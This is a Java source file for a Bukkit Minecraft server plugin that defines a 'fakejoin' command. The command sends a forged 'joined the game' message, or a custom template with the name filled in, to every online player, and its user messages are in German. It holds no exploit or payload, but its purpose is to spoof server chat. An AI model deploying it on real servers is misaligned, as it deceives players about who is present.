package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Command_FAKEJOIN extends CommandBase {
    public Command_FAKEJOIN() {
        super("fakejoin", "<Spieler> [CustomJoinMessage]", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 1){
            try{
                String v = args[0];
                p.sendMessage(Start.INSTANCE.chatPrefix + "Es wird nun gesendet.");
                for (Player p1 : Bukkit.getOnlinePlayers()){
                    p1.sendMessage("§e" + v + " joined the game.");
                }

            } catch (Exception ignored) {

            }
            return;
        }

        if (args.length == 2){
            try{
                String v = args[0];
                p.sendMessage(Start.INSTANCE.chatPrefix + "Es wird nun gesendet.");
                if (!args[1].contains("$")){
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Die Message muss $ enthalten. ($ = Spieler)");
                    return;
                }
                for (Player p1 : Bukkit.getOnlinePlayers()){
                    p1.sendMessage(args[1].replace("$", v));
                }

            } catch (Exception ignored) {
            }
        }
    }
}
